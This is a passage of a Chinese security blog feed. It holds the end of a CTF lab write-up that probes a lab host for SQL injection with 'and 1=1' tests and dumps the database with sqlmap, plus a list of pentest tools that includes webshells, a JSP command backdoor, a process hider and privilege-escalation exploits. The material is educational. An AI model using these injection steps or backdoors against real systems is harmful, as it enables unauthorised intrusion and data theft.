class="lozad"></p><p>7.得到的加密串构造地址：</p><p><a href="http://192.168.102.62/index.php?word=U0VMRUNUKyorRlJPTStsYW5ndWFnZStvcmRlcitieSt5ZWFy" target="_blank" rel="noopener">http://192.168.102.62/index.php?word=U0VMRUNUKyorRlJPTStsYW5ndWFnZStvcmRlcitieSt5ZWFy</a><br>8.访问得到 key:hello world 。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190903215033.png" class="lozad"></p><h1 id="0x03-一个SQL引发的血案"><a href="#0x03-一个SQL引发的血案" class="headerlink" title="0x03 一个SQL引发的血案"></a>0x03 一个SQL引发的血案</h1><h2 id="3-1-题目背景"><a href="#3-1-题目背景" class="headerlink" title="3.1 题目背景"></a>3.1 题目背景</h2><p>SQL 注入，就是通过把 SQL 命令插入到 Web 表单提交或输入域名或<br>页面请求的查询字符串，最终达到欺骗服务器执行恶意的 SQL 命令，比<br>如先前的很多影视网站泄露 VIP会员密码大多就是通过WEB表单递交查<br>询字符暴出的，这类表单特别容易受到 SQL 注入式攻击。</p><h2 id="3-2-题目描述"><a href="#3-2-题目描述" class="headerlink" title="3.2 题目描述"></a>3.2 题目描述</h2><p>一个 web 页面列了 2014 年 6 月编程语言排行榜。我们需要通过此页面，查<br>询到数据库里的内容，得到 key。</p><h2 id="3-3-答案提交"><a href="#3-3-答案提交" class="headerlink" title="3.3 答案提交"></a>3.3 答案提交</h2><ol><li>提交得到的 key。</li><li>请提交操作过程报告，报告中要包含操作的关键过程描述并附截图，以 WORD<br>方式提交。</li></ol><h2 id="3-4-提交key"><a href="#3-4-提交key" class="headerlink" title="3.4 提交key"></a>3.4 提交key</h2><p>​    key:I am sql inject</p><h2 id="3-5-关卡环境"><a href="#3-5-关卡环境" class="headerlink" title="3.5 关卡环境"></a>3.5 关卡环境</h2><p>VPC1( 虚拟 PC ） 工具场景：Windows XP 操作系统/BT5<br>VPC2( 虚拟 PC ） Window server xp<br>软件描述 使用工具场景集成的工具软件，参赛者也可以上传工具软<br>件软件到工具场景。<br>关卡环境描述<br>1、学生机与实验室网络直连<br>2、VPC 与实验室网络直连<br>3、学生机与 VPC 物理链路连通</p><h2 id="3-6参考步骤"><a href="#3-6参考步骤" class="headerlink" title="3.6参考步骤"></a>3.6参考步骤</h2><p>1.打开浏览器，访问 <a href="http://192.168.102.62。" target="_blank" rel="noopener">http://192.168.102.62。</a></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190903215511.png" class="lozad"></p><p>2.访问超链接：<br><a href="http://192.168.102.62/index.php?id=1" target="_blank" rel="noopener">http://192.168.102.62/index.php?id=1</a><br>通过修改 id 的值可以查看到相应排名的语言</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190903215543.png" class="lozad"></p><p>3.访问:<a href="http://192.168.102.62/index.php?id=1" target="_blank" rel="noopener">http://192.168.102.62/index.php?id=1</a> and 1=1 返回正确内容。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190903215614.png" class="lozad"></p><p><a href="http://192.168.102.62/index.php?id=1" target="_blank" rel="noopener">http://192.168.102.62/index.php?id=1</a> and 1=2 返回错误内容。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190903215627.png" class="lozad"></p><p>4.通过上面可以判断存在注入。Kali 下使用 sqlmap 获取数据库内容。<br>使用命令：sqlmap -u “<a href="http://192.168.102.62/index.php?id=1”" target="_blank" rel="noopener">http://192.168.102.62/index.php?id=1”</a> –dbs 查看数据库。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190903215708.png" class="lozad"></p><p>使用命令：sqlmap -u “<a href="http://192.168.102.62/index.php?id=1”" target="_blank" rel="noopener">http://192.168.102.62/index.php?id=1”</a> –dump -D “third” 获取数据库内容。得到 key：I am sql inject</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190903215738.png" class="lozad"></p><h1 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h1><h2 id="4-1-题目背景"><a href="#4-1-题目背景" class="headerlink" title="4.1 题目背景"></a>4.1 题目背景</h2><h2 id="4-2-题目描述"><a href="#4-2-题目描述" class="headerlink" title="4.2 题目描述"></a>4.2 题目描述</h2><h2 id="4-3-答案提交"><a href="#4-3-答案提交" class="headerlink" title="4.3 答案提交"></a>4.3 答案提交</h2><h2 id="4-4-提交key"><a href="#4-4-提交key" class="headerlink" title="4.4 提交key"></a>4.4 提交key</h2><h2 id="4-5-关卡环境"><a href="#4-5-关卡环境" class="headerlink" title="4.5 关卡环境"></a>4.5 关卡环境</h2><h2 id="4-6参考步骤"><a href="#4-6参考步骤" class="headerlink" title="4.6参考步骤"></a>4.6参考步骤</h2><h1 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h1><h2 id="5-1-题目背景"><a href="#5-1-题目背景" class="headerlink" title="5.1 题目背景"></a>5.1 题目背景</h2><h2 id="5-2-题目描述"><a href="#5-2-题目描述" class="headerlink" title="5.2 题目描述"></a>5.2 题目描述</h2><h2 id="5-3-答案提交"><a href="#5-3-答案提交" class="headerlink" title="5.3 答案提交"></a>5.3 答案提交</h2><h2 id="5-4-提交key"><a href="#5-4-提交key" class="headerlink" title="5.4 提交key"></a>5.4 提交key</h2><h2 id="5-5-关卡环境"><a href="#5-5-关卡环境" class="headerlink" title="5.5 关卡环境"></a>5.5 关卡环境</h2><h2 id="5-6参考步骤"><a href="#5-6参考步骤" class="headerlink" title="5.6参考步骤"></a>5.6参考步骤</h2><p>### </p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>优秀资源工具整理（不断更新中）</title>
    <link href="https://www.mad-coding.cn/2019/09/03/%E4%BC%98%E7%A7%80%E8%B5%84%E6%BA%90%E5%B7%A5%E5%85%B7%E6%95%B4%E7%90%86/"/>
    <id>https://www.mad-coding.cn/2019/09/03/优秀资源工具整理/</id>
    <published>2019-09-03T03:16:04.000Z</published>
    <updated>2019-10-10T06:32:37.676Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>在进行渗透测试的过程中，会用到大量的开源工具，每次在各种网站、论坛和知识星球中看到很多很好的工具，都没有时间进行及时的使用整理，久而久之就忘却了，所以使用该文章将每次碰到的优秀工具记录下来，然后在后期在进行归纳整理，既方便他人，也方便自己。皮卡皮卡~</p><a id="more"></a><h1 id="0x01-好用工具"><a href="#0x01-好用工具" class="headerlink" title="0x01 好用工具"></a>0x01 好用工具</h1><h2 id="1-1-B-XSSRF"><a href="#1-1-B-XSSRF" class="headerlink" title="1.1 B-XSSRF"></a>1.1 B-XSSRF</h2><p>用于检测和跟踪Blind XSS，XXE和SSRF的工具包</p><p><a href="https://github.com/SpiderMate/B-XSSRF" target="_blank" rel="noopener">https://github.com/SpiderMate/B-XSSRF</a></p><h2 id="1-2-BurpSuite-collections"><a href="#1-2-BurpSuite-collections" class="headerlink" title="1.2 BurpSuite-collections"></a>1.2 BurpSuite-collections</h2><p>BurpSuite收集：包括不限于Burp文章，破解版，插件（非BApp Store），汉化等相关教程</p><p><a href="https://github.com/Mr-xn/BurpSuite-collections" target="_blank" rel="noopener">https://github.com/Mr-xn/BurpSuite-collections</a></p><h2 id="1-3-排查网盘信息泄露"><a href="#1-3-排查网盘信息泄露" class="headerlink" title="1.3 排查网盘信息泄露"></a>1.3 排查网盘信息泄露</h2><p><a href="https://github.com/dongfangyuxiao/py-study/tree/master/py-study/威胁情报/网盘泄露" target="_blank" rel="noopener">https://github.com/dongfangyuxiao/py-study/tree/master/py-study/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/%E7%BD%91%E7%9B%98%E6%B3%84%E9%9C%B2</a></p><h2 id="1-4-pocsuite3"><a href="#1-4-pocsuite3" class="headerlink" title="1.4 pocsuite3"></a>1.4 pocsuite3</h2><p>pocsuite3是由Knownsec 404团队开发的开源远程漏洞测试框架</p><p><a href="https://github.com/knownsec/pocsuite3" target="_blank" rel="noopener">https://github.com/knownsec/pocsuite3</a></p><p><strong>进程隐藏工具libprocesshider.so</strong></p><p>此工具作用为劫持系统的readdir64和readdir函数，隐藏”proxy”进程。</p><h2 id="1-5-进程隐藏工具libprocesshider-so"><a href="#1-5-进程隐藏工具libprocesshider-so" class="headerlink" title="1.5 进程隐藏工具libprocesshider.so"></a>1.5 <strong>进程隐藏工具libprocesshider.so</strong></h2><p>此工具作用为劫持系统的readdir64和readdir函数，隐藏”proxy”进程。</p><h2 id="1-6-流量代理工具proxy"><a href="#1-6-流量代理工具proxy" class="headerlink" title="1.6 流量代理工具proxy"></a>1.6 <strong>流量代理工具proxy</strong></h2><p>Proxy为Dog Tunnel(狗洞)，<a href="https://github.com/vzex/dog-tunnel/，go语言编写的流量代理工具：" target="_blank" rel="noopener">https://github.com/vzex/dog-tunnel/，go语言编写的流量代理工具：</a></p><h2 id="1-7-冰蝎一句话木马"><a href="#1-7-冰蝎一句话木马" class="headerlink" title="1.7 冰蝎一句话木马"></a>1.7 <strong>冰蝎一句话木马</strong></h2><p>作为新型加密网站管理客户端，冰蝎算是作为中国菜刀的替代者。此次发现的样本为冰蝎JSP一句话木马</p><p><a href="https://github.com/rebeyond/Behinder/releases" target="_blank" rel="noopener">https://github.com/rebeyond/Behinder/releases</a></p><h2 id="1-8-JSP-WEB后门live-index-bank3-jsp"><a href="#1-8-JSP-WEB后门live-index-bank3-jsp" class="headerlink" title="1.8  JSP WEB后门live_index_bank3.jsp"></a>1.8  <strong>JSP WEB后门live_index_bank3.jsp</strong></h2><p>这是一个常规的JAVA WEB后门，通过调用.jsp?nox=”命令”来执行命令</p><h2 id="1-9-Linux辅助提权工具LinEnum-sh"><a href="#1-9-Linux辅助提权工具LinEnum-sh" class="headerlink" title="1.9  Linux辅助提权工具LinEnum.sh"></a>1.9  Linux辅助提权工具LinEnum.sh</h2><h2 id="1-10-脏牛提权工具c0w64"><a href="#1-10-脏牛提权工具c0w64" class="headerlink" title="1.10  脏牛提权工具c0w64"></a>1.10  <strong>脏牛提权工具c0w64</strong></h2><h2 id="1-11-内网流量代理工具agent-exe"><a href="#1-11-内网流量代理工具agent-exe" class="headerlink" title="1.11 内网流量代理工具agent.exe"></a>1.11 <strong>内网流量代理工具agent.exe</strong></h2><p>agent.exe是nps工具（<a href="https://github.com/cnlh/nps），" target="_blank" rel="noopener">https://github.com/cnlh/nps），</a></p><p>是一款轻量级、高性能、功能强大的内网穿透代理服务器。目前支持tcp、udp流量转发，可支持任何tcp、udp上层协议（访问内网网站、本地支付接口调试、ssh访问、远程桌面，内网dns解析等等……），此外还支持内网http代理、内网socks5代理、p2p等，并带有功能强大的web管理端：</p><h2 id="1-12-dog-tunnel"><a href="#1-12-dog-tunnel" class="headerlink" title="1.12 dog-tunnel"></a>1.12 <strong>dog-tunnel</strong></h2><p>基于KCP的P2P端口映射工具，同时支持SOCKS5代理</p><p><a href="https://github.com/vzex/dog-tunnel/" target="_blank" rel="noopener">https://github.com/vzex/dog-tunnel/</a></p><h2 id="1-13-sqlmap4burp"><a href="#1-13-sqlmap4burp" class="headerlink" title="1.13 sqlmap4burp ++"></a>1.13 sqlmap4burp ++</h2><p>sqlmap4burp ++是一款兼容于Windows，Mac，Linux的多个系统平台的打嗝与SqlMap的联动插件</p><h2 id="1-14-移动安全框架-MobSF"><a href="#1-14-移动安全框架-MobSF" class="headerlink" title="1.14 移动安全框架 - MobSF"></a>1.14 移动安全框架 - MobSF</h2><p><a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF/wiki/1.-Documentation" target="_blank" rel="noopener">https://github.com/MobSF/Mobile-Security-Framework-MobSF/wiki/1.-Documentation</a></p><h2 id="1-15-简单的iOS应用黑盒评估工具"><a href="#1-15-简单的iOS应用黑盒评估工具" class="headerlink" title="1.15 简单的iOS应用黑盒评估工具"></a>1.15 简单的iOS应用黑盒评估工具</h2><p><a href="https://github.com/chaitin/passionfruit" target="_blank" rel="noopener">https://github.com/chaitin/passionfruit</a></p><h2 id="1-16-适用于开发人员，逆向工程人员和安全研究人员的动态仪表工具包"><a href="#1-16-适用于开发人员，逆向工程人员和安全研究人员的动态仪表工具包" class="headerlink" title="1.16 适用于开发人员，逆向工程人员和安全研究人员的动态仪表工具包"></a>1.16 适用于开发人员，逆向工程人员和安全研究人员的动态仪表工具包</h2><p><a href="https://www.frida.re/" target="_blank" rel="noopener">https://www.frida.re/</a></p><h2 id="1-17-最先进的XSS扫描仪"><a href="#1-17-最先进的XSS扫描仪" class="headerlink" title="1.17 最先进的XSS扫描仪"></a>1.17 最先进的XSS扫描仪</h2><p><a href="https://github.com/s0md3v/XSStrike" target="_blank" rel="noopener">https://github.com/s0md3v/XSStrike</a></p><h2 id="1-18-XSS知识集合"><a href="#1-18-XSS知识集合" class="headerlink" title="1.18 XSS知识集合"></a>1.18 XSS知识集合</h2><p><a href="https://github.com/s0md3v/AwesomeXSS#awesome-xss-mind-maps" target="_blank" rel="noopener">https://github.com/s0md3v/AwesomeXSS#awesome-xss-mind-maps</a></p><h2 id="1-19-Lockdoor-Framework"><a href="#1-19-Lockdoor-Framework" class="headerlink" title="1.19 Lockdoor-Framework"></a>1.19 <strong>Lockdoor-Framework</strong></h2><p><a href="https://github.com/SofianeHamlaoui/Lockdoor-Framework" target="_blank" rel="noopener">https://github.com/SofianeHamlaoui/Lockdoor-Framework</a></p><h2 id="1-20-AttackSurfaceMapper-ASM"><a href="#1-20-AttackSurfaceMapper-ASM" class="headerlink" title="1.20 AttackSurfaceMapper(ASM)"></a>1.20 AttackSurfaceMapper(ASM)</h2><p>新型自动化渗透测试工具</p><p><a href="https://www.uedbox.com/post/59110/" target="_blank" rel="noopener">https://www.uedbox.com/post/59110/</a></p><h1 id="0x02-其他工具"><a href="#0x02-其他工具" class="headerlink" title="0x02 其他工具"></a>0x02 其他工具</h1><h2 id="2-1-URL缩短器polr"><a href="#2-1-URL缩短器polr" class="headerlink" title="2.1 URL缩短器polr"></a>2.1 URL缩短器<strong>polr</strong></h2><p><a href="https://github.com/cydrobolt/polr/" target="_blank" rel="noopener">https://github.com/cydrobolt/polr/</a></p><h1 id="0x03-参考链接"><a href="#0x03-参考链接" class="headerlink" title="0x03 参考链接"></a>0x03 参考链接</h1><p><a href="http://www.sohu.com/a/324075541_609556" target="_blank" rel="noopener">http://www.sohu.com/a/324075541_609556</a></p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;在进行渗透测试的过程中，会用到大量的开源工具，每次在各种网站、论坛和知识星球中看到很多很好的工具，都没有时间进行及时的使用整理，久而久之就忘却了，所以使用该文章将每次碰到的优秀工具记录下来，然后在后期在进行归纳整理，既方便他人，也方便自己。皮卡皮卡~&lt;/p&gt;
    
    </summary>
    
      <category term="安全工具" scheme="https://www.mad-coding.cn/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="安全工具" scheme="https://www.mad-coding.cn/tags/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
</feed>
